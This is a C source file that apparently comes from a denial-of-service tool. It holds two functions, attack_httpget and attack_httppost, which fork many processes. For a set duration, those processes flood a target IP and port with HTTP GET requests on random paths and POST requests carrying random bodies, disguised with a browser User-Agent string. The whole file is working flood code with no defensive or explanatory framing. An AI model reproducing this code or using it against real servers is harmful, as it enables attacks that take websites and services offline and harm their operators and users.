#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

void random_string(char *buf, int len) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (int i = 0; i < len; i++) {
        buf[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    buf[len] = '\0';
}

void attack_httpget(char *target, int port, int duration, int threads) {
    time_t end = time(NULL) + duration;

    for (int i = 0; i < threads; i++) {
        if (fork() == 0) {
            while (time(NULL) < end) {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons(port);
                inet_pton(AF_INET, target, &addr.sin_addr);

                if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
                    char path[64];
                    random_string(path, 16);
                    char request[512];
                    snprintf(request, sizeof(request),
                        "GET /%s HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                        "Accept: */*\r\n"
                        "Connection: keep-alive\r\n"
                        "\r\n", path, target);
                    send(sock, request, strlen(request), 0);
                }
                close(sock);
            }
            exit(0);
        }
    }
}

void attack_httppost(char *target, int port, int duration, int threads) {
    time_t end = time(NULL) + duration;

    for (int i = 0; i < threads; i++) {
        if (fork() == 0) {
            char data[2048];
            while (time(NULL) < end) {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                struct sockaddr_in addr;
                addr.sin_family = AF_INET;
                addr.sin_port = htons(port);
                inet_pton(AF_INET, target, &addr.sin_addr);

                if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
                    random_string(data, 1024);
                    char request[4096];
                    snprintf(request, sizeof(request),
                        "POST / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: %lu\r\n"
                        "Connection: keep-alive\r\n"
                        "\r\n%s", target, strlen(data), data);
                    send(sock, request, strlen(request), 0);
                }
                close(sock);
            }
            exit(0);
        }
    }
}